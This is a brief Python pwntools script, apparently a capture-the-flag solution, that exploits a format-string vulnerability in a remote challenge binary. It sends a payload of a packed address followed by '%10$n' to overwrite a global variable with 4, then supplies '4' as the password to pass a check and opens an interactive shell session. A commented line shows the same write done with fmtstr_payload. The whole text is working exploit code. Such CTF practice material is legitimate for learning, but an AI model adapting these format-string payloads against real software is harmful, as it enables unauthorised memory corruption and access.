from pwn import *
context.arch = 'i386'

# p = process('./pwn')
p = remote('node3.buuoj.cn',26421)

rand_num = 0x0804C044
payload = p32(rand_num) + '%10$n'
# cover the value of rand_num to 4 by format string vulnerability
# payload = fmtstr_payload(10,{0x0804C044:5})	# cover the value of rand_num to 5 by using func in pwntools
p.sendafter("your name:",payload)
p.sendafter("your passwd:",'4')
# transfer number 4 to pass the judgement
p.interactive()
